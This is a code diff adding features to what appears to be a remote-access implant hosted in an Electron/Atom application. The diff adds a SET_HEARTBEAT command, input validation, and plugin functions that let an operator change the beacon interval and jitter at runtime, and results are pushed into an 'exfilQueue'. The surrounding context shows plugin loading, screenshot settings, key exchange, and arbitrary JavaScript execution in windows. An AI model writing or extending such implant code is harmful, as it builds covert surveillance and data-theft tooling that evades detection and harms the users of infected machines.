@@ -240,6 +240,9 @@
           // Immediately check for tasks and report status
           checkTasks();
           reportStatus();
+
+          // Report initial heartbeat config so the UI has values to display
+          exfilQueue.push({ path: '/plugin/data/_system', data: { dataType: 'heartbeat_status', data: { success: true, baseInterval: __ATOM_CONFIG.heartbeat.baseInterval, jitterPercent: __ATOM_CONFIG.heartbeat.jitterPercent } } });
         }
       } else {
         // Key exchange failed — re-register
@@ -313,9 +316,27 @@
       loadPlugin(config);
     } else if (config.type === 'PLUGIN_UNLOAD') {
       unloadPlugin(config.pluginId);
+    } else if (config.type === 'SET_HEARTBEAT') {
+      handleSetHeartbeat(config);
     } else if (config.type === 'PLUGIN_COMMAND') {
       handlePluginCommand(config);
     }
+  }
+
+  function handleSetHeartbeat(config) {
+    var base = parseFloat(config.baseInterval);
+    var jitter = parseFloat(config.jitterPercent);
+    if (isNaN(base) || base < 0.5) {
+      exfilQueue.push({ path: '/plugin/data/_system', data: { dataType: 'heartbeat_status', data: { success: false, error: 'Base interval must be >= 0.5 seconds' } } });
+      return;
+    }
+    if (isNaN(jitter) || jitter < 0 || jitter > 100) {
+      exfilQueue.push({ path: '/plugin/data/_system', data: { dataType: 'heartbeat_status', data: { success: false, error: 'Jitter must be 0-100%' } } });
+      return;
+    }
+    __ATOM_CONFIG.heartbeat.baseInterval = base;
+    __ATOM_CONFIG.heartbeat.jitterPercent = jitter;
+    exfilQueue.push({ path: '/plugin/data/_system', data: { dataType: 'heartbeat_status', data: { success: true, baseInterval: base, jitterPercent: jitter } } });
   }
 
   function handleScreenshotSettingsTask(config) {
@@ -384,6 +405,19 @@
             wdata.webContents.executeJavaScript(code).catch(function() {});
           }
         }
+      },
+
+      // Heartbeat control — lets plugins adjust callback rate at runtime
+      setHeartbeatInterval: function(baseSeconds, jitterPercent) {
+        if (typeof baseSeconds === 'number' && baseSeconds >= 0.5) {
+          __ATOM_CONFIG.heartbeat.baseInterval = baseSeconds;
+        }
+        if (typeof jitterPercent === 'number' && jitterPercent >= 0 && jitterPercent <= 100) {
+          __ATOM_CONFIG.heartbeat.jitterPercent = jitterPercent;
+        }
+      },
+      getHeartbeatInterval: function() {
+        return { baseInterval: __ATOM_CONFIG.heartbeat.baseInterval, jitterPercent: __ATOM_CONFIG.heartbeat.jitterPercent };
       },
 
       // Node.js modules
